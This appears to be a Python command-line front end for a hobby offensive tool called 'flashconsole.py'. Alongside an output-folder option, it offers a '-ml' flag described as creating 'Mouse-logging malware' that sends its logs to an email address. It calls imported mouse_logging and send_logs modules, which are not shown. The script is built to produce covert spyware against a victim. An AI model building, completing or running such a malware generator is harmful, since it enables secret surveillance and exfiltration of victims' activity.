#!/usr/bin/python3
# Shebang, for ./ to work
# (user needs to give flashconsole.py executable permission first:
# bash --> # chmod +x flashconsole.py
# )

# Import necessary modules, libraries and folders
import argparse
import os
from termcolor import colored
import time
from logger import send_logs as send_email
from logger import mouse_logging as mouse_logger
import mysql.connector as sql

# Print the beginning
exec(open('/home/choki/projects/Flash-Project/metadata/beginning.py').read())

# Create an output folder if it doesnt exist, else print warning
def output_folder(out_file):
      if os.path.exists(out_file):
            print(colored('WARN: Output Folder already exists', 'yellow'))
            print(colored('Continuing...', 'blue'))
      else:
            open(out_file, 'w')

# Create the parser and add arguments
parser = argparse.ArgumentParser()

# 1
parser.add_argument('-o', help='Provide the command with an output folder.')

# 2
parser.add_argument('-ml', help='Create a Mouse-logging malware and send to an E-Mail.')

# Parse provided arguments
args = parser.parse_args()
# Check the results and run a function accordingly
if args.ml and args.o:
      # 1
      print('Destination: ', args.ml)
      print('Path: ', args.o)
      destination = args.ml
      path = str(args.o)
      # TODO Add OS checker (if-statement)
      output_folder_parts  = path.split("/")
      output_path = path.replace(str(output_folder_parts[-1]), "")
      mouse_logger.create(args.ml, args.o, output_path)

elif args.o:
      # 2
      output_folder(args.o)
